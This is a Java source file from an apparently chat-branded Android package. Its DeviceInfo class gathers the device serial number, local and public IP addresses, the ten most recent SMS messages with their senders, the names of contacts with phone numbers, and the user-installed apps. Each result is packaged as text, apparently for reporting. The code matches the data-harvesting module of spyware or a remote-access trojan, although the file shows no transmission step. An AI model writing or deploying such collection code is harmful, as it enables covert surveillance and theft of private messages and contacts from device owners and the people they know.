package com.meetin.chat;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.util.Enumeration;
import java.util.List;

public class DeviceInfo {
    private static final String TAG = "DeviceInfo";

    public static String getInfo(Context ctx) {
        return "Model: " + Build.MODEL +
               "\nAndroid: " + Build.VERSION.RELEASE +
               "\nDevice ID: " + Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
    }

    public static String getDeviceIp() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && !addr.isLinkLocalAddress()) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (SocketException e) {
            Log.e(TAG, "Error getting IP: " + e.getMessage());
        }
        return "127.0.0.1";
    }

    public static String getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            conn.disconnect();
            return ip != null ? ip : "Unknown";
        } catch (Exception e) {
            Log.e(TAG, "Error getting public IP: " + e.getMessage());
            return "Unknown";
        }
    }

    public static String getFullIpInfo(Context ctx) {
        String local = getDeviceIp();
        String external = getPublicIp();
        return "Local IP: " + local +
               "\nExternal IP: " + external;
    }

    public static String readSms(Context ctx) {
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {"address", "body"};
            Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 10");
            if (cursor == null) return "No SMS";
            StringBuilder sb = new StringBuilder("SMS:\n");
            while (cursor.moveToNext()) {
                sb.append(cursor.getString(0)).append(": ").append(cursor.getString(1)).append("\n");
            }
            cursor.close();
            return sb.toString();
        } catch (Exception e) {
            return "SMS error";
        }
    }

    public static String getContacts(Context ctx) {
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            String[] projection = {ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER};
            Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, null);
            if (cursor == null) return "No contacts access";
            StringBuilder sb = new StringBuilder("Contacts:\n");
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                int hasPhone = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                if (hasPhone > 0) {
                    sb.append(name).append("\n");
                }
            }
            cursor.close();
            return sb.toString();
        } catch (Exception e) {
            return "Contacts error";
        }
    }

    public static String getApps(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder("User-Installed Apps:\n");

            for (ApplicationInfo app : apps) {
                // Check if it's a user-installed app (not system)
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = pm.getApplicationLabel(app).toString();
                    sb.append("- ").append(appName).append("\n");
                }
            }

            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "Error getting apps: " + e.getMessage());
            return "❌ Failed to get app list";
        }
    }
}
